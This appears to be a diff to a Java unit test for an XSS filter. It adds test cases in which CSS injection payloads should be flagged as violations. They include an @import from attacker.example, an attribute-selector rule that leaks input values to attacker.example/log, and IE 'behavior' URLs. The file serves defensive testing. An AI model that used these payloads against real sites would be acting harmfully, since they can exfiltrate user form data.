@@ -97,6 +97,13 @@ public class XSSFilterImplTest {
         testData.add(new Object[] {"<table border=\"green\">invalid Test</table>", false});
         testData.add(new Object[] {"<script>invalid Test</script>", false});
         testData.add(new Object[] {"", false});
+        // CSS violations that filter() would strip must not be reported as violation-free by check()
+        testData.add(new Object[] {"<style>@import url(\"https://attacker.example/malicious.css\");</style>", false});
+        testData.add(new Object[] {
+            "<style>input[value^=\"a\"] {background: url(\"//attacker.example/log?a\");}</style>", false
+        });
+        testData.add(new Object[] {"<p style=\"behavior:url(#default#userData)\">hi</p>", false});
+        testData.add(new Object[] {"<style>h1 {color:red; behavior:url(#default#userData);}</style>", false});
         return testData;
     }
 
